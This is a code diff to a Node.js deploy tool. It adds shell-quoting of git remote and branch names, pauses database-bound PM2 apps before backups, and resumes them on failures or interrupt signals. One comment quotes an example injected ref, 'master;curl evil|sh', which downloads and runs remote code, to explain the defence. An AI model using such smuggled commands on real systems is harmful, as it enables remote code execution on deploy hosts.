@@ -4,10 +4,23 @@ const { runOnTarget, buildHealthCommand } = require('./exec');
 const { lockDir, prevShaFile, acquireLock } = require('./lock');
 const { log: defaultLog } = require('./log');
 const { backupIdFromOutput, backupReferenceFromId } = require('./backup-reference');
+const { resolveBranch } = require('./branch');
 
 function defaultSleep(seconds) {
   const ms = seconds * 1000;
   Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
+}
+
+// Single-quote a value for safe interpolation into a remote shell command,
+// escaping an embedded quote with the standard '\'' idiom. config.js already
+// rejects `branch`/`remote` outside a git-refname charset (no shell metacharacters
+// legally survive `git check-ref-format`), but that is a config-layer guard a
+// caller can bypass (`loadConfig({ validate: false })`) — this is the call-site
+// defense-in-depth so an unquoted, attacker-controlled ref (e.g. a target whose
+// `origin/HEAD` was renamed to `master;curl evil|sh`) can never reach the shell
+// unescaped.
+function shQuote(value) {
+  return `'${String(value).replace(/'/g, "'\\''")}'`;
 }
 
 // Path to the host layout marker. A legacy deploy/rollback must refuse to run
@@ -33,19 +46,6 @@ function assertNotReleaseHost(config, ctx) {
       + `layout config, or run against the correct target.`,
     );
   }
-}
-
-// Resolve the deploy branch: explicit config wins, else the target's origin/HEAD,
-// else 'master' (matches bewks resolve_deploy_branch).
-function resolveBranch(config, ctx) {
-  if (config.branch) return config.branch;
-  const res = runOnTarget(
-    `git rev-parse --abbrev-ref ${config.remote}/HEAD 2>/dev/null || true`,
-    config,
-    { capture: true, runtime: ctx.runtime },
-  );
-  const ref = (res.output || '').trim().replace(`${config.remote}/`, '');
-  return ref || 'master';
 }
 
 // The set of endpoints to health-gate: the scalar port/healthPath is always
@@ -146,7 +146,38 @@ function deploy(config, options = {}, ctx = {}) {
   const steps = [];
   let backupId = null;
 
+  // Once the DB-bound apps are paused for migration, EVERY subsequent step
+  // (backup, migrate, build) must bring them back up on failure — otherwise a
+  // failure leaves production stopped. Matches deploy.sh, which `pm2 start`s the
+  // paused apps on every post-stop failure before aborting. Declared before the
+  // lock/signal handlers below so a SIGINT/SIGTERM mid-deploy can resume them too.
+  let dbAppsPaused = false;
+  const resumeDbApps = () => {
+    if (dbAppsPaused && config.dbBoundApps.length) {
+      runOnTarget(`pm2 start ${config.dbBoundApps.join(' ')} 2>/dev/null || true`, config, { runtime });
+      dbAppsPaused = false;
+    }
+  };
+  // A gated step that, on failure, first resumes any paused apps, then aborts.
+  const safeStep = (message, command) => {
+    gate({ message, command }, config, c, { onFail: resumeDbApps });
+  };
+
   const release = acquireLock(config, c, { steal: stealLock });
+  // A default SIGINT/SIGTERM kill (Ctrl-C, `kill`) skips the `finally` below
+  // entirely, leaving any paused DB-bound apps stopped and the lock held forever
+  // (matches release.js's recovery registration, same reasoning). Best-effort:
+  // resume whatever was paused and drop the lock, then exit non-zero so the
+  // operator sees a clean stop instead of a hang.
+  const onSignal = (sig) => {
+    log.error(`Received ${sig} mid-deploy — resuming any paused apps and releasing the lock`);
+    try { resumeDbApps(); } catch (e) { log.error(e.message); }
+    try { release(); } catch (e) { log.error(e.message); }
+    process.exit(1);
+  };
+  const sigHandlers = { SIGINT: () => onSignal('SIGINT'), SIGTERM: () => onSignal('SIGTERM') };
+  process.on('SIGINT', sigHandlers.SIGINT);
+  process.on('SIGTERM', sigHandlers.SIGTERM);
   try {
     // Fail closed if the host was migrated to the release layout but this config
     // still asks for a legacy in-place deploy.
@@ -171,8 +202,8 @@ function deploy(config, options = {}, ctx = {}) {
     // the exact code that was live before this deploy.
     run('Recording current revision', `git rev-parse HEAD > ${prevShaFile(config)} 2>/dev/null || true`, { tolerate: true });
 
-    run('Fetching latest', `git fetch ${config.remote} --prune`);
-    run(`Pulling ${config.remote}/${branch} (--ff-only)`, `git pull --ff-only ${config.remote} ${branch}`);
+    run('Fetching latest', `git fetch ${shQuote(config.remote)} --prune`);
+    run(`Pulling ${config.remote}/${branch} (--ff-only)`, `git pull --ff-only ${shQuote(config.remote)} ${shQuote(branch)}`);
     steps.push(`pull:${branch}`);
 
     if (stash) {
@@ -189,22 +220,6 @@ function deploy(config, options = {}, ctx = {}) {
       steps.push('install');
     }
 
-    // Once the DB-bound apps are paused for migration, EVERY subsequent step
-    // (migrate, build) must bring them back up on failure — otherwise a build
-    // error leaves production stopped. Matches deploy.sh, which `pm2 start`s the
-    // paused apps on every post-stop failure before aborting.
-    let dbAppsPaused = false;
-    const resumeDbApps = () => {
-      if (dbAppsPaused && config.dbBoundApps.length) {
-        runOnTarget(`pm2 start ${config.dbBoundApps.join(' ')} 2>/dev/null || true`, config, { runtime });
-        dbAppsPaused = false;
-      }
-    };
-    // A gated step that, on failure, first resumes any paused apps, then aborts.
-    const safeStep = (message, command) => {
-      gate({ message, command }, config, c, { onFail: resumeDbApps });
-    };
-
     const doBuild = !skipBuild && config.hooks.build;
 
     if (buildBeforeMigrate && doBuild) {
@@ -215,26 +230,30 @@ function deploy(config, options = {}, ctx = {}) {
     }
 
     if (!skipMigrate) {
+      if (config.dbBoundApps.length) {
+        // Stop DB-bound processes BEFORE the backup — matches release.js
+        // (:488-494): a writer left online during the snapshot can produce an
+        // inconsistent backup, defeating the entire reason the backup gate exists.
+        run(`Pausing DB-bound apps (${config.dbBoundApps.join(', ')})`,
+          `pm2 stop ${config.dbBoundApps.join(' ')} 2>/dev/null || true`, { tolerate: true });
+        dbAppsPaused = true;
+      }
       if (config.hooks.backup) {
-        // Backup BEFORE migrating; a failed backup aborts before any schema change
-        // (apps are still running here, so no resume needed).
+        // Backup BEFORE migrating, AFTER writers are stopped. A failed backup must
+        // still abort before any schema change — apps are already paused by now,
+        // so (unlike before this fix) resume them on failure, same as every other
+        // gate in this window.
         const backup = gate(
           { message: 'Pre-migration database backup', command: config.hooks.backup },
           config,
           c,
-          { capture: true },
+          { capture: true, onFail: resumeDbApps },
         );
         // Capture is required to correlate the backup with the delivery event.
         // Replay stdout so legacy hooks retain their operator-visible output.
         for (const line of (backup.output || '').split('\n').filter(Boolean)) log.info(line);
         backupId = backupIdFromOutput(backup.output, { log });
         steps.push('backup');
-      }
-      if (config.dbBoundApps.length) {
-        // Stop DB-bound processes so they release the SQLite lock before migrate.
-        run(`Pausing DB-bound apps (${config.dbBoundApps.join(', ')})`,
-          `pm2 stop ${config.dbBoundApps.join(' ')} 2>/dev/null || true`, { tolerate: true });
-        dbAppsPaused = true;
       }
       if (config.hooks.migrate) {
         safeStep('Running database migrations', config.hooks.migrate);
@@ -262,7 +281,6 @@ function deploy(config, options = {}, ctx = {}) {
     if (config.appNames.length) {
       const restartCmd = config.hooks.restart || pm2StartOrRestart(config.appNames, config);
       run(`Restarting apps (${config.appNames.join(', ')})`, restartCmd);
-      dbAppsPaused = false;
       steps.push('restart');
 
       // Ensure auxiliary PM2 processes are up after the main restart — a cloudflared
@@ -277,9 +295,30 @@ function deploy(config, options = {}, ctx = {}) {
       run('Persisting PM2 process list', 'pm2 save 2>/dev/null || true', { tolerate: true });
     }
 
+    // A dbBoundApp we paused above is only brought back if something else happens
+    // to cover it: appNames restarts, or the ensureApps loop. One covered by
+    // neither was left stopped while the deploy reported success (PKG-82 Bug 3).
+    // ensureApps only runs when appNames is non-empty, so it counts as coverage
+    // only under that same condition — otherwise a stranded app would be missed
+    // again whenever appNames is empty.
+    if (dbAppsPaused) {
+      const ensured = config.appNames.length ? config.ensureApps : [];
+      const stranded = config.dbBoundApps.filter(
+        (name) => !config.appNames.includes(name) && !ensured.includes(name),
+      );
+      if (stranded.length) {
+        run(`Restarting DB-bound apps (${stranded.join(', ')})`, pm2StartOrRestart(stranded, config));
+      }
+      dbAppsPaused = false;
+    }
+
     const healthy = waitForHealth(config, c);
     if (!healthy) {
-      throw new Error('Deploy completed but the application is unhealthy');
+      throw new Error(
+        'Deploy completed but the application is unhealthy: the new code is now live and failing health '
+        + 'checks. Legacy deploys have no previous release to auto-flip back to — run `deploy-kit rollback` '
+        + 'to restore the previous revision.',
+      );
     }
     steps.push('health');
 
@@ -303,6 +342,10 @@ function deploy(config, options = {}, ctx = {}) {
     log.success('Deployment completed successfully');
     return { branch, mode: config.mode, host: config.host, steps, healthy };
   } finally {
+    // Remove the signal handlers on every exit path (success or thrown) so they
+    // never leak across calls — matches release.js's own SIGINT/SIGTERM cleanup.
+    process.removeListener('SIGINT', sigHandlers.SIGINT);
+    process.removeListener('SIGTERM', sigHandlers.SIGTERM);
     release();
   }
 }
